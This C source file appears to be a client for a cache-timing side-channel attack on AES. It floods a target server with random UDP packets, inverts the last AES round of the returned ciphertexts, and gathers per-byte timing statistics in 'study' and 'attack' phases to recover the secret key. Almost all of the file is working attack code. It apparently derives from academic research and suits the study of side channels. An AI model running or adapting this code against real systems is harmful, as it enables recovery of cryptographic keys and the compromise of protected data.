#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <stdio.h>
#include <math.h>


#define GETU32(pt) (((uint32_t)(pt)[0] << 24)           \
	^ ((uint32_t)(pt)[1] << 16)        \
	^ ((uint32_t)(pt)[2] <<  8)        \
	^ ((uint32_t)(pt)[3]))

#define PUTU32(ct, st) {(ct)[0] = (uint8_t)((st) >> 24);        \
		(ct)[1] = (uint8_t)((st) >> 16);        \
		(ct)[2] = (uint8_t)((st) >>  8);        \
		(ct)[3] = (uint8_t)(st);}

double packets;
double ttotal;
double t[16][256];
double tsq[16][256];
long long tnum[16][256];
double u[16][256];
double udev[16][256];
char n[16];

void tally(double timing)
{
	int j;
	int b;
	for (j = 0;j < 16;++j) {
		b = 255 & (int) n[j];
		++packets;
		ttotal += timing;
		t[j][b] += timing;
		tsq[j][b] += timing * timing;
		tnum[j][b] += 1;
	}
}

/**
	Inverts the ciphertext till the output of s-boxes
	
	@param in			cipher text
	@param out			inverted ciphertext
	@param attack_bool	true if it is attack phase, false if it is study phase

*/
void InvLastRound(unsigned char *in, unsigned char *out, int attack_bool)
{
	// define the last round key for study phase, all zeros 128-bit key
	uint32_t last_rk[4] = {0xb4ef5bcb, 0x3e92e211, 0x23e951cf, 0x6f8f188e};	
	uint32_t s0, s1, s2, s3, t0, t1, t2, t3;

	if (attack_bool==0){ // study phase
		// invert add round key
		t0 = GETU32(in     ) ^ last_rk[0];
		t1 = GETU32(in +  4) ^ last_rk[1];
		t2 = GETU32(in +  8) ^ last_rk[2];
		t3 = GETU32(in + 12) ^ last_rk[3];
		
		// invert shift row
		s0 = (t0 &  0xff000000) ^
		(t3 &  0x00ff0000) ^
		(t2 &  0x0000ff00) ^
		(t1 &  0x000000ff);

		s1 = (t1 &  0xff000000) ^
		(t0 &  0x00ff0000) ^
		(t3 &  0x0000ff00) ^
		(t2 &  0x000000ff);

		s2 = (t2 &  0xff000000) ^
		(t1 &  0x00ff0000) ^
		(t0 &  0x0000ff00) ^
		(t3 &  0x000000ff);

		s3 = (t3 &  0xff000000) ^
		(t2 &  0x00ff0000) ^
		(t1 &  0x0000ff00) ^
		(t0 &  0x000000ff);
	}
	else { // attack phase
	
		// just invert shift rows, we will obtain inverse shift row state of the secretkey
		t0 = GETU32(in     );
		t1 = GETU32(in +  4);
		t2 = GETU32(in +  8);
		t3 = GETU32(in + 12);
		
		// invert shift row
		s0 = (t0 &  0xff000000) ^
		(t3 &  0x00ff0000) ^
		(t2 &  0x0000ff00) ^
		(t1 &  0x000000ff);

		s1 = (t1 &  0xff000000) ^
		(t0 &  0x00ff0000) ^
		(t3 &  0x0000ff00) ^
		(t2 &  0x000000ff);

		s2 = (t2 &  0xff000000) ^
		(t1 &  0x00ff0000) ^
		(t0 &  0x0000ff00) ^
		(t3 &  0x000000ff);

		s3 = (t3 &  0xff000000) ^
		(t2 &  0x00ff0000) ^
		(t1 &  0x0000ff00) ^
		(t0 &  0x000000ff);
	}

	// give the result to the output
	PUTU32(out     , s0);
	PUTU32(out+4   , s1);
	PUTU32(out+8   , s2);
	PUTU32(out+12  , s3);
}


int s;
int size;
int attack_bool;

void studyinput(void)
{
	int j;
	char packet[2048];
	unsigned char response[40];
	unsigned char cipher_text[16];
	struct pollfd p;

	for (;;) {
		if (size < 16) continue;
		if (size > sizeof packet) continue;
		
		for (j = 0;j < size;++j) packet[j] = random();		
		
		// for (j = 0;j < 16;++j) n[j] = packet[j]; // from original code
		send(s,packet,size,0);
		p.fd = s;
		p.events = POLLIN;
		if (poll(&p,1,100) <= 0) continue;
		while (p.revents & POLLIN) {
			if (recv(s,response,sizeof response,0) == sizeof response) {
				if (!memcmp(packet,response,16)) {
					// print the cipher text
					for (j=0; j<16; j++){
						//printf("%02x ", response[j+16]); // for debug
						cipher_text[j] = response[j+16]; // load the cipher text array
					}
					//printf("\n"); // for debug
					InvLastRound(cipher_text, cipher_text, attack_bool); // Invert the last round
					// print the inverted last round
					for (j=0; j<16; j++){
						//printf("%02x ", cipher_text[j]); // for debug
						n[j] = cipher_text[j];
					}
					//printf("\n"); // for debug
					
					unsigned int timing;
					timing = *(unsigned int *) (response + 36);
					timing -= *(unsigned int *) (response + 32);
					if (timing < 10000) { /* clip tail to reduce noise */
						tally(timing);
						return;
					}
				}
			}
			if (poll(&p,1,0) <= 0) break;
		}
	}
}

void printpatterns(void)
{
	int j;
	int b;
	double taverage;
	taverage = ttotal / packets;
	for (j = 0;j < 16;++j){
		for (b = 0;b < 256;++b) {
			u[j][b] = t[j][b] / tnum[j][b];
			udev[j][b] = tsq[j][b] / tnum[j][b];
			udev[j][b] -= u[j][b] * u[j][b];
			udev[j][b] = sqrt(udev[j][b]);
		}
	}
	for (j = 0;j < 16;++j) {
		for (b = 0;b < 256;++b) {
			printf("%2d %4d %3d %lld %.3f %.3f %.3f %.3f\n"
			,j
			,size
			,b
			,tnum[j][b]
			,u[j][b]
			,udev[j][b]
			,u[j][b] - taverage
			,udev[j][b] / sqrt(tnum[j][b])
			);
		}
	}
	fflush(stdout);
}

int timetoprint(long long inputs)
{
	if (inputs < 10000) return 0;
	if (!(inputs & (inputs - 1))) return 1;
	return 0;
}

int main(int argc,char **argv)
{

	int i = 0;
	struct sockaddr_in server;
	long long inputs = 0;
	if (!argv[1]) return 100;
	if (!inet_aton(argv[1],&server.sin_addr)) return 100;
	server.sin_family = AF_INET;
	server.sin_port = htons(10000);
	if (!argv[2]) return 100;
	size = atoi(argv[2]);
	
	if(!argv[3]) return 100;
	attack_bool = atoi(argv[3]);
	
	while ((s = socket(AF_INET,SOCK_DGRAM,0)) == -1) sleep(1);
	while (connect(s,(struct sockaddr *) &server,sizeof server) == -1) sleep(1);

	for (;;) {
		studyinput();
		++inputs;
		if (timetoprint(inputs)){
			printpatterns();
			// @i=0 2^14 packs are sent
			// we need 2^30 
			if(i==16){
				break;
			}
			i++;
		}
	}
}	


